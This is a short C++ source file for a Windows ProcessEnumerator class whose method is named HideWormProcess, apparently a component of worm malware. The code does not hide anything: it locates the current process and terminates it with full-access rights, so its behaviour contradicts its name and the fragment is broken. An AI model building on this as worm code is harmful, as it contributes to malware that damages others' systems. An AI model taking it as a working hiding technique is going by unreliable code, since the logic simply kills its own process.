#include "ProcessEnumerator.h"

ProcessEnumerator::ProcessEnumerator() {
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
}

ProcessEnumerator::~ProcessEnumerator() {
    if (hProcessSnap != INVALID_HANDLE_VALUE) {
        CloseHandle(hProcessSnap);
    }
}

void ProcessEnumerator::HideWormProcess() {
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hProcessSnap, &pe32)) {
        return;
    }

    DWORD currentProcessId = GetCurrentProcessId();
    do {
        if (pe32.th32ProcessID == currentProcessId) {
            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
            if (hProcess != NULL) {
                TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
            }
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));
}
